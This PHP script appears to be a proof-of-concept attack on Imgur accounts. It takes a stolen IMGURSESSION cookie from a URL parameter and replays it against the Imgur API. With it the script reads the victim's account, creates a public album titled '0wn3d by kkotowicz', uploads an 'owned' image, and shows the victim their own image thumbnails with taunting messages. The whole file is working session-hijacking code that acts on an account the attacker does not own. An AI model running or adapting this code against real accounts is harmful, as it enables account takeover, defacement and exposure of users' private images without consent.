<?php
$session = $_GET['sid'];

/**
 * Send a POST requst using cURL
 * @param string $url to request
 * @param array $post values to send
 * @param array $options for cURL
 * @return string
 */
function curl_post($url, array $post = NULL, array $options = array())
{
    $defaults = array(
        CURLOPT_POST => 1,
        CURLOPT_HEADER => 0,
        CURLOPT_URL => $url,
        CURLOPT_FRESH_CONNECT => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FORBID_REUSE => 1,
        CURLOPT_TIMEOUT => 4,
        CURLOPT_POSTFIELDS => $post
    );

    $ch = curl_init();
    curl_setopt_array($ch, ($options + $defaults));
    if( ! $result = curl_exec($ch))
    {
        trigger_error(curl_error($ch));
    }
    curl_close($ch);
    return $result;
}

function curl_get($url, array $get = NULL, array $options = array())
{
    $defaults = array(
        CURLOPT_URL => $url. (strpos($url, '?') === FALSE ? '?' : ''). http_build_query($get),
        CURLOPT_HEADER => 0,
        CURLOPT_RETURNTRANSFER => TRUE,
        CURLOPT_TIMEOUT => 4
    );

    $ch = curl_init();
    curl_setopt_array($ch, ($options + $defaults));
    if( ! $result = curl_exec($ch))
    {
        trigger_error(curl_error($ch));
    }
    curl_close($ch);
    return $result;
}

$cookies = array(
    CURLOPT_COOKIE => 'IMGURSESSION=' . $session,
);

$acc = curl_get('http://api.imgur.com/2/account.json', array(), $cookies);
$acc = json_decode($acc);

// create public album
$resp = curl_post('http://api.imgur.com/2/account/albums.json', array(
	'title'	=> '0wn3d by kkotowicz',
	'privacy' => 'public',
    'layout' => 'blog',
), $cookies);

$resp = json_decode($resp);

$album_id = $resp->albums->id;
if (!$album_id) {
    echo "Sorry, error occured.";
    die();
}

// get all images
$resp = curl_get('http://api.imgur.com/2/account/images.json', array(), $cookies);
$resp = json_decode($resp);

$images = array();

if (!empty($resp->images)) {
	foreach ($resp->images as $img) {
		$images[] = $img->links->small_square;
		if (count($images) > 10)
		  break;
	}
}
// upload image
$resp = curl_post('http://api.imgur.com/2/account/images.json', array(
    'image' => '@' . realpath('owned.jpg'),
    'type' => 'file',
    'name' => 'owned.jpg',
	'caption' => '0wn3d by kkotowicz',
), $cookies);

$resp = json_decode($resp);

$image_id = $resp->images->image->hash;

$resp = curl_post('http://api.imgur.com/2/account/albums/' . $album_id . '.json', array(
    'add_images' => $image_id,
), $cookies);

$resp = json_decode($resp);

echo '<div style="border: 3px solid red; padding: 5px;"><h1>Hello, ' . htmlspecialchars($acc->account->url). "!</h1>";

if ($images) {
    echo "<p>Do these look familiar?</p>";
    foreach ($images as $url) {
    	echo "<img src='" . htmlspecialchars($url) . "'> ";
    }
}

echo 
     '<p><a target=_blank href="'
     . htmlspecialchars($resp->albums[0]->links->imgur_page)
      . '">Look what you\'ve done!</a></p></div>';
